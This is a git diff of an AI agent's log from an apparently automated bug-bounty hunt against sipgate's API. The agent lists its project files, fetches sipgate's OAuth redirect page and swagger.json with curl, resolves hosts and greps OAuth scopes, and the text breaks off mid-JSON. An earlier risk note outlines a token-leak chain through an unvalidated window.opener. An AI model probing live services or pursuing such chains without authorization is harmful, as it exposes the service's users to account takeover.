@@ -7495,3 +7495,754 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] sipgate: 52 — Up from 47: prior cycles proved only defense-in-depth (uniform edge authz, inert redirects, unreachable :3396). This cycle surfaces a live, previously-unseen OAuth landmine: an implicit-only, public, high-scope client (`sipgate-swagger-ui`) whose callback redirect page hands the token fragment to an unvalidated attacker `window.opener` — the first genuinely exploitable step reasoned on live-confirmed primitives since the S3/BOLA/portal chain was gated. Still no confirmed standalone critical chain (H1 requires a logged-in victim session + human browser PoC; H2/H3/H4 remain external-credential-gated). Upside capped until the HUMAN PoC confirms delivered scopes.
+===== ANALYST bigpickle 2026-09-06 04:14:13 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/sipgate-hunt/sipgate-hunt 2>/dev/null && echo "---" && ls -la /home/runner/work/sipgate-hunt/sipgate-hunt/art 2>/dev/null
+total 220
+drwxr-xr-x 12 runner runner  4096 Sep  6 03:58 .
+drwxr-xr-x  3 runner runner  4096 Sep  6 03:58 ..
+drwxr-xr-x  7 runner runner  4096 Sep  6 03:58 .git
+drwxr-xr-x  3 runner runner  4096 Sep  6 03:58 .github
+-rw-r--r--  1 runner runner  1755 Sep  6 03:58 README.md
+-rw-r--r--  1 runner runner    32 Sep  6 03:58 analyst-out.txt
+-rw-r--r--  1 runner runner 66846 Sep  6 03:58 analyst-prompt.txt
+-rw-r--r--  1 runner runner 63029 Sep  6 03:58 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 inventory
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 knowledge
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 leads
+-rw-r--r--  1 runner runner   696 Sep  6 03:58 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 recon-notes
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 reports
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 reposcan-raw
+-rw-r--r--  1 runner runner  3230 Sep  6 03:58 scope.yml
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 scripts
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_laguna.json
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_ling3.json
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_longcat.json
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_mimo.json
+-rw-r--r--  1 runner runner    33 Sep  6 03:58 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 triage
+---
+[0m
+[0m✱ [0mGlob "**/*.txt"[90m 9 matches[0m
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead analyst-out.txt
+[0m
+[0m$ [0mls -la /home/runner/work/sipgate-hunt/sipgate-hunt/leads /home/runner/work/sipgate-hunt/sipgate-hunt/knowledge /home/runner/work/sipgate-hunt/sipgate-hunt/triage /home/runner/work/sipgate-hunt/sipgate-hunt/inventory /home/runner/work/sipgate-hunt/sipgate-hunt/reports /home/runner/work/sipgate-hunt/sipgate-hunt/scripts /home/runner/work/sipgate-hunt/sipgate-hunt/recon-notes 2>/dev/null
+/home/runner/work/sipgate-hunt/sipgate-hunt/inventory:
+total 32
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner  4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner 24127 Sep  6 03:58 sipgate.md
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/knowledge:
+total 32
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner  4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner 24291 Sep  6 03:58 index.md
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/leads:
+total 380
+drwxr-xr-x  2 runner runner   4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner   4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner 117199 Sep  6 03:58 lead-bigpickle.md
+-rw-r--r--  1 runner runner    969 Sep  6 03:58 lead-laguna.md
+-rw-r--r--  1 runner runner    950 Sep  6 03:58 lead-ling3.md
+-rw-r--r--  1 runner runner    988 Sep  6 03:58 lead-longcat.md
+-rw-r--r--  1 runner runner     18 Sep  6 03:58 lead-mimo.md
+-rw-r--r--  1 runner runner 231300 Sep  6 03:58 lead-nemotron3.md
+-rw-r--r--  1 runner runner  10142 Sep  6 03:58 reposcan-sipgate.md
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/recon-notes:
+total 12
+drwxr-xr-x  2 runner runner 4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner 4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner  816 Sep  6 03:58 DEDICATED-DEEP.md
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/reports:
+total 1200
+drwxr-xr-x  2 runner runner   4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner   4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner 655821 Sep  6 03:58 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   4123 Sep  6 03:58 analyst-laguna.log
+-rw-r--r--  1 runner runner   4104 Sep  6 03:58 analyst-ling3.log
+-rw-r--r--  1 runner runner   4142 Sep  6 03:58 analyst-longcat.log
+-rw-r--r--  1 runner runner 436060 Sep  6 03:58 analyst-nemotron3.log
+-rw-r--r--  1 runner runner  13017 Sep  6 03:58 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner     51 Sep  6 03:58 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner     50 Sep  6 03:58 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner     52 Sep  6 03:58 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   9999 Sep  6 03:58 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  65887 Sep  6 03:58 hypotheses.md
+-rw-r--r--  1 runner runner    868 Sep  6 03:58 valid-bugs.md
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/scripts:
+total 28
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner  4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner 16987 Sep  6 03:58 sync-issues.py
+
+/home/runner/work/sipgate-hunt/sipgate-hunt/triage:
+total 128
+drwxr-xr-x  2 runner runner  4096 Sep  6 03:58 .
+drwxr-xr-x 12 runner runner  4096 Sep  6 03:58 ..
+-rw-r--r--  1 runner runner     0 Sep  6 03:58 .gitkeep
+-rw-r--r--  1 runner runner   351 Sep  6 03:58 run-2026-09-02-21-54.md
+-rw-r--r--  1 runner runner   203 Sep  6 03:58 run-2026-09-02-23-57.md
+-rw-r--r--  1 runner runner   163 Sep  6 03:58 run-2026-09-03-04-11.md
+-rw-r--r--  1 runner runner   188 Sep  6 03:58 run-2026-09-03-09-00.md
+-rw-r--r--  1 runner runner   146 Sep  6 03:58 run-2026-09-03-13-31.md
+-rw-r--r--  1 runner runner   216 Sep  6 03:58 run-2026-09-03-17-15.md
+-rw-r--r--  1 runner runner   202 Sep  6 03:58 run-2026-09-03-19-56.md
+-rw-r--r--  1 runner runner   208 Sep  6 03:58 run-2026-09-03-22-30.md
+-rw-r--r--  1 runner runner 16946 Sep  6 03:58 run-2026-09-04-00-35.md
+-rw-r--r--  1 runner runner   197 Sep  6 03:58 run-2026-09-04-05-08.md
+-rw-r--r--  1 runner runner   236 Sep  6 03:58 run-2026-09-04-09-44.md
+-rw-r--r--  1 runner runner   221 Sep  6 03:58 run-2026-09-04-14-08.md
+-rw-r--r--  1 runner runner   204 Sep  6 03:58 run-2026-09-04-17-40.md
+-rw-r--r--  1 runner runner   180 Sep  6 03:58 run-2026-09-04-19-55.md
+-rw-r--r--  1 runner runner   173 Sep  6 03:58 run-2026-09-04-22-17.md
+-rw-r--r--  1 runner runner   331 Sep  6 03:58 run-2026-09-05-00-13.md
+-rw-r--r--  1 runner runner   186 Sep  6 03:58 run-2026-09-05-04-40.md
+-rw-r--r--  1 runner runner   159 Sep  6 03:58 run-2026-09-05-08-40.md
+-rw-r--r--  1 runner runner   179 Sep  6 03:58 run-2026-09-05-12-06.md
+-rw-r--r--  1 runner runner   226 Sep  6 03:58 run-2026-09-05-15-22.md
+-rw-r--r--  1 runner runner   195 Sep  6 03:58 run-2026-09-05-17-39.md
+-rw-r--r--  1 runner runner   152 Sep  6 03:58 run-2026-09-05-19-33.md
+-rw-r--r--  1 runner runner   195 Sep  6 03:58 run-2026-09-05-21-41.md
+-rw-r--r--  1 runner runner 10502 Sep  6 03:58 run-2026-09-05-23-46.md
+[0m
+[0m→ [0mRead reports/hypotheses-nemotron3.txt
+[0m→ [0mRead reports/hypotheses-bigpickle.txt
+[0m→ [0mRead scope.yml
+[0m→ [0mRead reports/valid-bugs.md
+[0m
+[0m$ [0mcd /home/runner/work/sipgate-hunt/sipgate-hunt && git log --oneline -15 && echo "---STATE---" && cat state_bigpickle.json && echo && cat state_nemotron3.json
+b07a2e4 reposcan 2026-09-06-00-11
+---STATE---
+{"phase": "POC", "target": "api"}
+{"phase": "POC", "target": "api"}
+[0m
+[0m→ [0mRead reports/hypotheses-laguna.txt
+[0m→ [0mRead reposcan-raw/summary.txt
+[0m→ [0mRead leads/reposcan-sipgate.md
+[0m
+[0m$ [0mcurl -sS --max-time 15 -D - -o /tmp/opencode/oauth2-redirect.html "https://api.sipgate.com/v2/doc/oauth2-redirect.html" 2>&1 | head -40; echo "=== BODY SIZE ==="; wc -c /tmp/opencode/oauth2-redirect.html
+HTTP/1.1 200 OK
+cache-control: max-age=0
+content-type: text/html; charset=utf-8
+last-modified: Mon, 30 Oct 2023 17:32:32 GMT
+set-cookie: SERVERID=web-apps-web02; path=/; HttpOnly; Secure
+vary: origin
+x-b3-traceid: 1cb7c40855620aa6734a3b20d86a9afb
+date: Sun, 06 Sep 2026 03:59:51 GMT
+transfer-encoding: chunked
+
+=== BODY SIZE ===
+2690 /tmp/opencode/oauth2-redirect.html
+[0m
+[0m$ [0mgetent hosts sipgate.io www.sipgate.io api.sipgate.io developer.sipgate.io docs.sipgate.io login.sipgate.io www.sipgate.co.uk team.sipgate.co.uk 2>/dev/null; echo "---done---"
+2606:4700:7::a29f:862a sipgate.io
+2606:4700:7::a29f:872a sipgate.io
+2606:4700:7::a29f:862a www.sipgate.io
+2606:4700:7::a29f:872a www.sipgate.io
+217.10.72.43    web-redirects.service.sipgate.net developer.sipgate.io
+2606:4700:7::a29f:872a www.sipgate.co.uk
+2606:4700:7::a29f:862a www.sipgate.co.uk
+---done---
+[0m
+[0m→ [0mRead /tmp/opencode/oauth2-redirect.html
+[0m
+[0m$ [0msleep 1; curl -sS --max-time 15 "https://api.sipgate.com/v2/doc/" -o /tmp/opencode/doc.html 2>&1; wc -c /tmp/opencode/doc.html; sleep 1; curl -sS --max-time 15 "https://api.sipgate.com/v2/swagger.json" -o /tmp/opencode/swagger.json 2>&1; wc -c /tmp/opencode/swagger.json
+833 /tmp/opencode/doc.html
+191699 /tmp/opencode/swagger.json
+[0m
+[0m→ [0mRead /tmp/opencode/doc.html
+[0m
+[0m$ [0mgrep -n -A 12 -i "securityDefinitions\|securitySchemes\|oauth2\|authorizationUrl\|scopes" /tmp/opencode/swagger.json | head -80
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_074e08117001xRQaB8Lyitz9vx
+
+}},"404":{"description":"User not found"}},"security":[{"oauth2":["all","users:read"]}],"summary":"Get a specific user","tags":["users"]}},"/users/{userId}/busyonbusy":{"put":{"description":"","operationId":"setBusyOnBusySetting","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetBusyOnBusySettingsRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","users:busyonbusy:write"]}],"summary":"Update the busy on busy setting for a user","tags":["users"]}},"/users/{userId}/defaultdevice":{"put":{"description":"","operationId":"setDefaultDevice","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetDefaultDeviceRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","users:read","users:defaultdevice:write"]}],"summary":"Update default device for an existing user","tags":["users"]}},"/users/{userId}/location":{"put":{"description":"","operationId":"setLocation","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetLocationRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","users:write"]}],"summary":"Set location for user","tags":["users"]}},"/voicemails":{"get":{"description":"","operationId":"getVoicemails","parameters":[],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/VoicemailsResponse"}}},"security":[{"oauth2":["all","voicemails:read"]}],"summary":"List all voicemails","tags":["voicemails"]}},"/voicemails/{voicemailId}":{"get":{"description":"","operationId":"getVoicemail","parameters":[{"description":"The unique voicemail identifier","in":"path","name":"voicemailId","required":true,"type":"string","x-example":"v0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/VoicemailResponse"}}},"security":[{"oauth2":["all","voicemails:read"]}],"summary":"Get a single voicemail","tags":["voicemails"]}},"/{userId}/callrestrictions/{restriction}":{"post":{"description":"","operationId":"setCallRestriction","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The name of the call restriction","in":"path","name":"restriction","required":true,"type":"string","x-example":"roaming"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetCallRestrictionRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/CallRestrictionResponse"}},"404":{"description":"Call restriction not found"}},"security":[{"oauth2":["all","callrestrictions:write"]}],"summary":"Enable/disable restriction","tags":["callrestrictions"]}},"/{userId}/devices":{"get":{"description":"","operationId":"getDevices","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"Comma-separated list of device types to filter. Allowed values: all, app, register, mobile, external","in":"query","name":"type","required":false,"type":"string","x-example":"register,mobile,external"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/DevicesResponse"}}},"security":[{"oauth2":["all","devices:read"]}],"summary":"List all devices","tags":["devices"]},"post":{"description":"If you want to create a new register device the Restriction CAN_CREATE_REGISTER_DEVICE needs to be true for the specified userId.","operationId":"createDevice","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/CreateDeviceRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/DeviceResponse"}}},"security":[{"oauth2":["all","devices:write"]}],"summary":"Create a new device","tags":["devices"]}},"/{userId}/devices/external":{"post":{"description":"If you want to create a new external device the Restriction CAN_CREATE_EXTERNAL_DEVICE needs to be true for the specified userId.","operationId":"createExternalDevice","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/CreateExternalDeviceRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/ExternalDeviceResponse"}}},"security":[{"oauth2":["all","devices:write"]}],"summary":"Create a new external device","tags":["devices"]}},"/{userId}/devices/mobile":{"post":{"description":"If you want to create a new mobile device the Restriction CAN_CREATE_MOBILE_DEVICE needs to be true for the specified userId.","operationId":"createMobileDevice","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/CreateMobileDeviceRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/MobileDeviceResponse"}}},"security":[{"oauth2":["all","devices:write"]}],"summary":"Create a new mobile device","tags":["devices"]}},"/{userId}/devices/register":{"post":{"description":"If you want to create a new register device the Restriction CAN_CREATE_REGISTER_DEVICE needs to be true for the specified userId.","operationId":"createRegisterDevice","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/CreateRegisterDeviceRequest"}}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/RegisterDeviceResponse"}}},"security":[{"oauth2":["all","devices:write"]}],"summary":"Create a new register device","tags":["devices"]}},"/{userId}/devices/{deviceId}/contingents":{"get":{"description":"","operationId":"getDeviceContingents","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique device identifier","in":"path","name":"deviceId","required":true,"type":"string","x-example":"y0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/DeviceContingentsResponse"}}},"security":[{"oauth2":["all","devices:read"]}],"summary":"List all device contingents","tags":["devices"]}},"/{userId}/devices/{deviceId}/sim":{"delete":{"description":"","operationId":"deactivateSim","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique mobile device identifier","in":"path","name":"deviceId","required":true,"type":"string","x-example":"y0"}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","devices:write","devices:sim:write"]}],"summary":"Deactivate the SIM card for a specific device","tags":["devices"]},"post":{"description":"","operationId":"activateSim","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique mobile device identifier","in":"path","name":"deviceId","required":true,"type":"string","x-example":"y0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/ActivateSimRequest"}}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","devices:write","devices:sim:write"]}],"summary":"Activate a SIM card for a specific device","tags":["devices"]}},"/{userId}/devices/{deviceId}/sim/orders":{"post":{"description":"","operationId":"orderSim","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique mobile device identifier","in":"path","name":"deviceId","required":true,"type":"string","x-example":"y0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/OrderSimRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"User or device not found"}},"security":[{"oauth2":["all","devices:write","devices:sim:write","devices:sims:orders:write"]}],"summary":"Order a new SIM card for a specific device","tags":["devices"]}},"/{userId}/faxlines":{"get":{"description":"","operationId":"getUserFaxlines","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/FaxlinesResponse"}},"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","faxlines:read"]}],"summary":"List all fax lines","tags":["faxlines"]},"post":{"description":"","operationId":"createFaxline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/FaxlineResponse"}}},"security":[{"oauth2":["all","faxlines:write"]}],"summary":"Create a new fax line","tags":["faxlines"]}},"/{userId}/faxlines/{faxlineId}":{"delete":{"description":"","operationId":"deleteFaxline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","faxlines:write"]}],"summary":"Delete an existing fax line","tags":["faxlines"]},"put":{"description":"","operationId":"changeFaxlineAlias","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/SetAliasRequest"}}],"produces":["application/json"],"responses":{"404":{"description":"Faxline not found"}},"security":[{"oauth2":["all","faxlines:write"]}],"summary":"Update alias for an existing fax line","tags":["faxlines"]}},"/{userId}/faxlines/{faxlineId}/callerid":{"get":{"description":"","operationId":"getFaxlineCallerId","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/FaxlineCallerIdResponse"}},"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","faxlines:read"]}],"summary":"Get the caller ID of a specific fax line","tags":["faxlines"]},"put":{"description":"","operationId":"changeFaxlineCallerIdSettings","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/FaxlineCallerIdRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","faxlines:write"]}],"summary":"Update the caller ID for an existing fax line","tags":["faxlines"]}},"/{userId}/faxlines/{faxlineId}/numbers":{"get":{"description":"","operationId":"getFaxlineNumbers","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/EndpointNumbersResponse"}}},"security":[{"oauth2":["all","faxlines:read","faxlines:numbers:read"]}],"summary":"List all phone numbers routed to fax line","tags":["faxlines"]}},"/{userId}/faxlines/{faxlineId}/tagline":{"put":{"description":"","operationId":"changeTagline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique fax line identifier","in":"path","name":"faxlineId","required":true,"type":"string","x-example":"f0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/FaxlineTaglineRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Feature not booked"}},"security":[{"oauth2":["all","faxlines:write"]}],"summary":"Update tagline of an existing fax line","tags":["faxlines"]}},"/{userId}/notifications":{"get":{"description":"","operationId":"getNotifications","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/NotificationsResponse"}}},"security":[{"oauth2":["all","notifications:read"]}],"summary":"Get all notifications","tags":["notifications"]}},"/{userId}/notifications/call/email":{"post":{"description":"","operationId":"createEmailNotificationForCall","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddCallEmailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Limit reached"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new email notification for calls","tags":["notifications"]}},"/{userId}/notifications/call/sms":{"post":{"description":"","operationId":"createSmsNotificationForCall","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddCallSmsNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Limit reached"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new sms notification for calls","tags":["notifications"]}},"/{userId}/notifications/fax/email":{"post":{"description":"","operationId":"addFaxEmailNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddFaxEmailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Fax feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new email notification for faxes","tags":["notifications"]}},"/{userId}/notifications/fax/report":{"post":{"description":"","operationId":"addFaxReportEmailNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddFaxReportEmailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Fax feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new email notification for fax reports","tags":["notifications"]}},"/{userId}/notifications/fax/sms":{"post":{"description":"","operationId":"addFaxSmsNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddFaxSmsNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Fax feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new sms notification for faxes","tags":["notifications"]}},"/{userId}/notifications/sms/email":{"post":{"description":"","operationId":"addSmsEmailNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddSmsEmailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"SMSToMail feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new email notification for incoming sms","tags":["notifications"]}},"/{userId}/notifications/voicemail/email":{"post":{"description":"","operationId":"addVoicemailEmailNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddVoicemailEmailVoicemailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Voicemail feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new email notification for voicemails","tags":["notifications"]}},"/{userId}/notifications/voicemail/sms":{"post":{"description":"","operationId":"addVoicemailSmsNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"in":"body","name":"body","required":false,"schema":{"$ref":"#/definitions/AddVoicemailSmslVoicemailNotificationRequest"}}],"produces":["application/json"],"responses":{"403":{"description":"Voicemail feature not booked"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Create a new sms notification for voicemails","tags":["notifications"]}},"/{userId}/notifications/{notificationId}":{"delete":{"description":"","operationId":"deleteNotification","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique notification identifier","in":"path","name":"notificationId","required":true,"type":"string","x-example":"abc123"}],"produces":["application/json"],"responses":{"default":{"description":"successful operation"}},"security":[{"oauth2":["all","notifications:write"]}],"summary":"Delete an existing notification","tags":["notifications"]}},"/{userId}/numbers":{"get":{"description":"Possible portState->status codes:<br /><pre>100: Waiting for user fax\n150: WBCI waiting for mail opt-in\n160: WBCI opt-in hash generated\n170: WBCI opt-in link clicked\n200: Waiting for fax from current network operator\n250: WBCI send\n251: WBCI network error\n252: WBCI EKP rejected\n400: Porting accepted\n450: Waiting for data exchange\n451: Data exchange error\n500: Porting complete\n600: Porting cancelled\n</pre>","operationId":"getUserNumbers","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/NumbersResponse"}}},"security":[{"oauth2":["all","numbers:read"]}],"summary":"List all user phone numbers of a specific user","tags":["numbers"]}},"/{userId}/phonelines":{"get":{"description":"","operationId":"getPhonelines","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/SimplePhonelinesResponse"}}},"security":[{"oauth2":["all","phonelines:read"]}],"summary":"List all phone lines","tags":["phonelines"]},"post":{"description":"","operationId":"createPhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/SimplePhonelineResponse"}}},"security":[{"oauth2":["all","phonelines:write"]}],"summary":"Create a new phone line","tags":["phonelines"]}},"/{userId}/phonelines/{phonelineId}":{"delete":{"description":"","operationId":"deletePhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"404":{"description":"Phoneline not found"}},"security":[{"oauth2":["all","phonelines:write"]}],"summary":"Delete an existing phone line","tags":["phonelines"]},"get":{"description":"","operationId":"getPhoneline","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone line identifier","in":"path","name":"phonelineId","required":true,"type":"string","x-example":"p0"}],"produces":["application/json"],"responses":{"200":{"description":"successful operation","schema":{"$ref":"#/definitions/PhonelineResponse"}}},"security":[{"oauth2":["all","phonelines:read"]}],"summary":"Get a single phoneline","tags":["phonelines"]},"put":{"description":"","operationId":"setPhonelineAlias","parameters":[{"description":"The unique user identifier","in":"path","name":"userId","required":true,"type":"string","x-example":"w0"},{"description":"The unique phone 